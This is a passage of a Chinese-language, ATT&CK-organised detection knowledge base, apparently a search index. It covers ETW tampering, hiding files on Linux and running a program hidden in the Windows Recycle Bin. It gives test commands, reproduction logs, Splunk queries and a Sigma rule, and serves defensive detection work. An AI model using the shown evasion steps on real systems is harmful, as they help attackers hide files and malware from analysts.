Instrumentation\uff08WMI\uff09\u53ef\u4ee5\u7528\u4e8e\u8ba2\u9605ETW\u63d0\u4f9b\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u8bb0\u5f55\u4ece\u7279\u5b9a\u8ddf\u8e2a\u4f1a\u8bdd\u4e2d\u5220\u9664\u7684\u4efb\u4f55\u63d0\u4f9b\u7a0b\u5e8f\u3002\u8981\u68c0\u6d4bETW\u4e2d\u7684\u66f4\u6539\uff0c\u60a8\u8fd8\u53ef\u4ee5\u76d1\u89c6\u5305\u542b\u6240\u6709ETW\u4e8b\u4ef6\u63d0\u4f9b\u7a0b\u5e8f\u914d\u7f6e\u7684\u6ce8\u518c\u8868\u9879\uff1aHKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\ Autologger\\AUTOLOGGER_NAME {{PROVIDER_GUID}} index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=16) OR (EventCode IN (12,13) TargetObject=\u201cHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger*\u201d) OR (EventCode=1 Image=\u201d*\\\\logman.exe\u201d CommandLine=\u201d*update trace*\u201d) OR (EventCode=1 Image=\u201d*\\\\wpr\u201d)//tampering Event Tracing in windows index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\logman.exe\u201d CommandLine=\u201d*query*\u201d) OR (EventCode IN (12,13) TargetObject=\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Publishers*\u201d) // enumirating the ETW in windows with logman,exe","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_7","text":"MITRE-ATT&CK-T1562-006 https://attack.mitre.org/techniques/T1562/006/ \u5982\u4f55\u5229\u7528ETW\uff08Event Tracing for Windows\uff09\u8bb0\u5f55\u65e5\u5fd7 https://www.cnblogs.com/artech/p/logging-via-etw.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/","text":"T1564-001-linux-\u9690\u85cf\u6587\u4ef6\u548c\u76ee\u5f55 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u8bef\u64cd\u4f5c\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u6982\u5ff5\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u666e\u901a\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u660e\u786e\u8981\u6c42\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u547d\u4ee4\u884c\u67e5\u770b\u9690\u85cf\u6587\u4ef6\u3002\u4f8b\u5982\uff08windows\u4e0b\u7684dir /a\uff0clinux\u6216MAC\u4e0b\u7684ls -a\u547d\u4ee4\u7b49\uff09 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u9690\u85cf\u7cfb\u7edf\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u4ee5\u4fbf\u6301\u4e45\u5316\u5e76\u9003\u907f\u4e0d\u8fdb\u884c\u9690\u85cf\u6587\u4ef6\u5206\u6790\u7684\u7528\u6237\u6216\u5206\u6790\u5e08\u3002 linux/mac \u7528\u6237\u53ef\u4ee5\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u53ea\u9700\u5c06\u201c.\u201d\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u70b9\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u65e0\u6cd5\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201cls\u201d\uff09\u4e2d\u67e5\u770b\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002\u5bf9\u4e8e\u547d\u4ee4\u884c\u7528\u6cd5\uff0c\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u6807\u5fd7\u6765\u67e5\u770b\u6240\u6709\u6587\u4ef6\uff08\u5305\u62ec\u9690\u85cf\u6587\u4ef6\uff09\u3002\u8981\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u4e2d\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5fc5\u987b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1adefaults write com.apple.finder AppleShowAllFiles YES\uff0c\u7136\u540e\u91cd\u65b0\u542f\u52a8Finder\u5e94\u7528\u7a0b\u5e8f\u3002 \u6d4b\u8bd5\u6848\u4f8b mkdir .xx-a #\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\u5939 mv file to a .file #\u79fb\u52a8\u6587\u4ef6\u5230\u76ee\u5f55a\u4e0b\u5e76\u4fee\u6539\u4e3a\u9690\u85cf\u6587\u4ef6 \u68c0\u6d4b\u65e5\u5fd7 bash\u5386\u53f2\u8bb0\u5f55 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u53ef\u4ee5\u4ece\u4e00\u4e9b\u7279\u5b9a\u76ee\u5f55\u8def\u5f84\u4e2d\u67e5\u627e\u5230\u9690\u85cf\u6587\u4ef6/\u76ee\u5f55\uff0c\u5e76\u5c06\u5176\u8f6c\u50a8\u5230\u67d0\u4e2a\u4f4d\u7f6e\u3002\u63d0\u53d6\u51fa\u53ef\u4ee5\u6587\u4ef6\u5939\u5e76\u67e5\u627e\u6076\u610f\u9690\u85cf\u6587\u4ef6\u3002 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/xx$ sudo mkdir .xx-a icbc@icbc:/xx$ sudo mv 1.sh /xx/.sh \u6d4b\u8bd5\u7559\u75d5 icbc@icbc:/$ history 1 sudo mkdir .xx-a 2 sudo mv 1.sh /xx/.sh \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 index=linux sourcetype=bash_history bash_command=\"mkdir .*\" | table host,user_name,bash_command index=linux sourcetype=bash_history bash_command=\"mv . \" | table host,user_name,bash_command \u5efa\u8bae \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u76f4\u63a5\u5728\u95ee\u9898\u4e3b\u673a\u4e0a\u8fdb\u884c\u67e5\u627e\uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u767d\u540d\u5355\u6765\u8fc7\u6ee4\u6389linux\u7cfb\u7edf\u4e2d\u7684\u6807\u51c6\u9690\u85cf\u6587\u4ef6/\u76ee\u5f55\u3002\u8fd9\u6837\u53ef\u4ee5\u51cf\u8f7b\u8bef\u62a5\u3002 find_hidden_files.sh find /home/ -name \".*\" find /home/ -type d -name \".*\" find /home/ -type f -name \".*\" \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1564-001 https://attack.mitre.org/techniques/T1564/001/","title":"T1564-001-linux-\u9690\u85cf\u6587\u4ef6\u548c\u76ee\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#t1564-001-linux-","text":"","title":"T1564-001-linux-\u9690\u85cf\u6587\u4ef6\u548c\u76ee\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#attck","text":"\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u8bef\u64cd\u4f5c\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u6982\u5ff5\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u666e\u901a\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u660e\u786e\u8981\u6c42\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u547d\u4ee4\u884c\u67e5\u770b\u9690\u85cf\u6587\u4ef6\u3002\u4f8b\u5982\uff08windows\u4e0b\u7684dir /a\uff0clinux\u6216MAC\u4e0b\u7684ls -a\u547d\u4ee4\u7b49\uff09 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u9690\u85cf\u7cfb\u7edf\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u4ee5\u4fbf\u6301\u4e45\u5316\u5e76\u9003\u907f\u4e0d\u8fdb\u884c\u9690\u85cf\u6587\u4ef6\u5206\u6790\u7684\u7528\u6237\u6216\u5206\u6790\u5e08\u3002 linux/mac \u7528\u6237\u53ef\u4ee5\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u53ea\u9700\u5c06\u201c.\u201d\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u70b9\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u65e0\u6cd5\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201cls\u201d\uff09\u4e2d\u67e5\u770b\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002\u5bf9\u4e8e\u547d\u4ee4\u884c\u7528\u6cd5\uff0c\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u6807\u5fd7\u6765\u67e5\u770b\u6240\u6709\u6587\u4ef6\uff08\u5305\u62ec\u9690\u85cf\u6587\u4ef6\uff09\u3002\u8981\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u4e2d\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5fc5\u987b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1adefaults write com.apple.finder AppleShowAllFiles YES\uff0c\u7136\u540e\u91cd\u65b0\u542f\u52a8Finder\u5e94\u7528\u7a0b\u5e8f\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_1","text":"mkdir .xx-a #\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\u5939 mv file to a .file #\u79fb\u52a8\u6587\u4ef6\u5230\u76ee\u5f55a\u4e0b\u5e76\u4fee\u6539\u4e3a\u9690\u85cf\u6587\u4ef6","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_2","text":"bash\u5386\u53f2\u8bb0\u5f55 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u53ef\u4ee5\u4ece\u4e00\u4e9b\u7279\u5b9a\u76ee\u5f55\u8def\u5f84\u4e2d\u67e5\u627e\u5230\u9690\u85cf\u6587\u4ef6/\u76ee\u5f55\uff0c\u5e76\u5c06\u5176\u8f6c\u50a8\u5230\u67d0\u4e2a\u4f4d\u7f6e\u3002\u63d0\u53d6\u51fa\u53ef\u4ee5\u6587\u4ef6\u5939\u5e76\u67e5\u627e\u6076\u610f\u9690\u85cf\u6587\u4ef6\u3002","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_3","text":"icbc@icbc:/xx$ sudo mkdir .xx-a icbc@icbc:/xx$ sudo mv 1.sh /xx/.sh","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_4","text":"icbc@icbc:/$ history 1 sudo mkdir .xx-a 2 sudo mv 1.sh /xx/.sh","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#splunk","text":"index=linux sourcetype=bash_history bash_command=\"mkdir .*\" | table host,user_name,bash_command index=linux sourcetype=bash_history bash_command=\"mv . \" | table host,user_name,bash_command","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_6","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u76f4\u63a5\u5728\u95ee\u9898\u4e3b\u673a\u4e0a\u8fdb\u884c\u67e5\u627e\uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u767d\u540d\u5355\u6765\u8fc7\u6ee4\u6389linux\u7cfb\u7edf\u4e2d\u7684\u6807\u51c6\u9690\u85cf\u6587\u4ef6/\u76ee\u5f55\u3002\u8fd9\u6837\u53ef\u4ee5\u51cf\u8f7b\u8bef\u62a5\u3002 find_hidden_files.sh find /home/ -name \".*\" find /home/ -type d -name \".*\" find /home/ -type f -name \".*\"","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_7","text":"MITRE-ATT&CK-T1564-001 https://attack.mitre.org/techniques/T1564/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","text":"T1564-001-win-\u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u548c\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u9690\u85cf\uff0c\u4ee5\u9003\u907f\u68c0\u6d4b\u673a\u5236\u3002\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u610f\u5916\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u529f\u80fd\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u5e38\u89c4\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u4f7f\u7528\u547d\u4ee4\u884c\u5f00\u5173\uff08\u5bf9\u4e8eWindows\u4e3adir /a\uff0c\u5bf9\u4e8eLinux\u548cmacOS\u4e3als \u2013a\uff09\u660e\u786e\u8981\u6c42\u663e\u793a\u9690\u85cf\u6587\u4ef6\u3002 \u5728Linux\u548cMac\u4e0a\uff0c\u7528\u6237\u53ea\u9700\u5c06\u201c.\u201d\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u5373\u53ef\u5c06\u5176\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201c ls\u201d\uff09\u4e2d\u4e0d\u4f1a\u9690\u85cf\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002 macOS\u4e0a\u7684\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7528UF_HIDDEN\u6807\u5fd7\u6807\u8bb0\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u5728Finder.app\u4e2d\u770b\u5230\u5b83\u4eec\uff0c\u4f46\u4ecd\u7136\u5141\u8bb8\u5728Terminal.app \u4e2d\u770b\u5230\u5b83\u4eec\u3002\u5728Windows\u4e0a\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528attrib.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f1a\u521b\u5efa\u8fd9\u4e9b\u9690\u85cf\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u6765\u5b58\u50a8\u4fe1\u606f\uff0c\u4ee5\u514d\u4f7f\u7528\u6237\u7684\u5de5\u4f5c\u7a7a\u95f4\u53d8\u5f97\u6df7\u4e71\u3002\u4f8b\u5982\uff0cSSH\u5b9e\u7528\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a.ssh\u6587\u4ef6\u5939\uff0c\u8be5\u6587\u4ef6\u5939\u5904\u4e8e\u9690\u85cf\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7684\u5df2\u77e5\u4e3b\u673a\u548c\u5bc6\u94a5\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u4f18\u52bf\u6765\u9690\u85cf\u7cfb\u7edf\u4e0a\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u9003\u907f\u4e0d\u5305\u542b\u5bf9\u9690\u85cf\u6587\u4ef6\u7684\u8c03\u67e5\u7684\u5178\u578b\u7528\u6237\u6216\u7cfb\u7edf\u5206\u6790\u3002 \u6d4b\u8bd5\u6848\u4f8b \u653b\u51fb\u8005\u8c03\u7528\u9690\u85cf\u5728\u56de\u6536\u7ad9\u4e2d\u7684\u6076\u610f\u7a0b\u5e8f\u3002$recycle.bin\u6587\u4ef6\u5939\u662f\u7cfb\u7edf\u91cd\u8981\u7684\u9690\u85cf\u6587\u4ef6\uff0c\u4e00\u822c\u5b58\u5728\u4e8e\u78c1\u76d8\u6839\u76ee\u5f55\u4e0b\u3002\u662f\u7cfb\u7edf\u201c\u56de\u6536\u7ad9\u201d\u5728\u6bcf\u4e00\u4e2a\u78c1\u76d8\u4e0a\u7684\u94fe\u63a5\u6587\u4ef6\u5939\uff0c\u7528\u4e8e\u4fdd\u5b58\u78c1\u76d8\u4e0a\u5220\u9664\u7684\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u4fe1\u606f\uff0c\u6211\u4eec\u6062\u590d\u8bef\u5220\u9664\u5230\u56de\u6536\u7ad9\u4e2d\u7684\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u65f6\u5927\u6709\u7528\u5904\u3002\u4e00\u822c\u6211\u4eec\u8bbe\u7f6e\u663e\u793a\u78c1\u76d8\u7684\u9690\u85cf\u6587\u4ef6\u540e\uff0c\u624d\u80fd\u770b\u5230\u5b83\u3002 Win Vista\u4ee5\u524dWindows\u7cfb\u7edf\uff0c\u8be5\u6587\u4ef6\u5939\u540d\u79f0\u4e3a\uff1aRecycle ;Win Vista(Win7/8)\u4ee5\u540e\u7cfb\u7edf\u4e00\u822c\u540d\u79f0\u4e3a$RECYCLE.BIN \u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>C:\\$Recycle.bin\\$R54R99P.exe nbtscan 1.0.35 - 2008-04-08 - http://www.unixwiz.net/tools/ usage: C:\\$Recycle.bin\\$R54R99P.exe [options] target [targets...] Targets are lists of IP addresses, DNS names, or address ranges. Ranges can be in /nbits notation (\"192.168.12.0/24\") or with a range in the last octet (\"192.168.12.64-97\") -V show Version information -f show Full NBT resource record responses (recommended) -H generate HTTP headers -v turn on more Verbose debugging -n No looking up inverse names of IP addresses responding -p <n> bind to UDP Port <n> (default=0) -m include MAC address in response (implied by '-f') -T <n> Timeout the no-responses in <n> seconds (default=2 secs) -w <n> Wait <n> msecs after each write (default=10 ms) -t <n> Try each address <n> tries (default=1) -1 Use Winsock 1 only -P generate results in perl hashref format \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 windows server 2016 \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6ID\uff1a4688 \u65e5\u5fd7\u540d\u79f0: Security \u6765\u6e90: Microsoft-Windows-Security-Auditing \u65e5\u671f: 2021/4/6 17:39:04 \u4e8b\u4ef6 ID: 4688 \u4efb\u52a1\u7c7b\u522b: \u8fdb\u7a0b\u521b\u5efa \u7ea7\u522b: \u4fe1\u606f \u5173\u952e\u5b57: \u5ba1\u6838\u6210\u529f \u7528\u6237: \u6682\u7f3a \u8ba1\u7b97\u673a: 12306BR0B4DD.361a.com \u63cf\u8ff0: \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507C3 \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x1224 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\$Recycle.Bin\\$R54R99P.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1937 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x15d8 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: C:\\$Recycle.bin\\$R54R99P.exe \u68c0\u6d4b\u89c4\u5219/\u601d\u8def title: \u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6 description: \u68c0\u6d4b\u653b\u51fb\u8005\u6267\u884c\u9690\u85cf\u5728\u56de\u6536\u7ad9\u4e2d\u7684\u6076\u610f\u7a0b\u5e8f status: experimental references: - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/Malware_In_recyclebin.txt logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: 4688 #Windows \u5b89\u5168\u65e5\u5fd7\uff0c\u8fdb\u7a0b\u521b\u5efa ParentProcessName: - 'cmd.exe' - 'ftp.exe' - 'schtasks.exe' - 'powershell.exe' - 'rundll32.exe' - 'regsvr32.exe' - 'msiexec.exe' Commanline: '*Recycle*' \u200b condition: selection level: high \u5efa\u8bae \u57fa\u4e8ewindows\u5b89\u5168\u65e5\u5fd7\uff08\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\uff09\u6216\u8005Sysmon\u65e5\u5fd7\u53ef\u8fdb\u884c\u6709\u6548\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1564-001 https://attack.mitre.org/techniques/T1564/001/ windows10\u7cfb\u7edf$recycle.bin\u7684\u8be6\u7ec6\u5220\u9664\u65b9\u6cd5\u4ecb\u7ecd https://www.pconline.com.cn/win10/1102/11023668.html","title":"T1564-001-win-\u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#t1564-001-win-","text":"","title":"T1564-001-win-\u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u548c\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u9690\u85cf\uff0c\u4ee5\u9003\u907f\u68c0\u6d4b\u673a\u5236\u3002\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u610f\u5916\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d